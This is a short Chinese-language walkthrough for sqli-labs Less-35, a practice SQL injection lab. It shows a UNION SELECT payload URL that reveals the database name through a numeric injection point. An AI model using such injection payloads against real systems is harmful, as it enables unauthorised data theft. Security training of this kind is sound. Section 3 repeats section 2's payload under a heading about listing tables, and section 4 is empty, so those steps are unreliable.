---
title: Less - 35
date: 2023-03-17T13:31:49Z
lastmod: 2023-03-17T19:56:48Z
---

# Less - 35

---

# 通关教程

---

## 1、判断闭合

---

先使用id=1

​​​![image](assets/image-20230317135022-3l82gxg.png)​​​

​​![image](assets/image-20230317135042-36erzzx.png)​​

这里单引号被转义了，我们直接查看源代码

​![image](assets/image-20230317134120-6806deg.png)​

这里也使用了GBK编码，但是我们根据错误信息判断这关为数字型注入，有没有单引号都无所谓，后面只要注意进行16进制转码就可以了-

---

## 2、查看当前数据库

---

```http
http://192.168.1.108/sqli-labs/Less-35/?id=-1 union select 1,2,database()--+
```

​​![image](assets/image-20230317135116-oh20e1o.png)​​

---

## 3、查看security库下的所有表

---

```http
http://192.168.225.132/sqli-labs/Less-35/?id=-1 union select 1,2,database()--+
```

​![image](assets/image-20230317195216-ea6aqj3.png)​

---

## 4、查看security库下的所有表

---

```http
```

​![image](assets/image-20230317195648-lksv9dl.png)​
